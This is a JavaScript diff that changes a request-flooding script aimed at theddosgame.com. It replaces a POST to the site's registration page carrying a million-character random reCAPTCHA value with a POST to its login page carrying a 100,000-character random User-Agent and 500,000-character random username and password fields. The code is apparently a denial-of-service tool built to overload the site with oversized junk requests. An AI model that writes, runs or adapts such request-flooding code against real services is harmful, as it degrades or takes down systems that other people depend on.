@@ -31,27 +31,24 @@ function makeid(length) {
    }
    return result;
 }
-fetch("https://theddosgame.com/process.php", {
-  "headers": {
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "accept-language": "en-US,en;q=0.9",
-    "cache-control": "max-age=0",
-    "content-type": "application/x-www-form-urlencoded",
-    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"104\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Linux\"",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-user": "?1",
-    "upgrade-insecure-requests": "1"
-  },
-  "referrer": "https://theddosgame.com/register.php",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "username=&pass=&cpass=&secret=123456&g-recaptcha-response="+makeid(1000000)+"&register=",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
+fetch("https://theddosgame.com/authenticate.php", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": makeid(100000),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Alt-Used": "theddosgame.com",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1"
+    },
+    "referrer": "https://theddosgame.com/",
+    "body": "username="+makeid(500000)+"&pass="+makeid(500000)+"&login=",
+    "method": "POST",
+    "mode": "cors"
 })
 
 
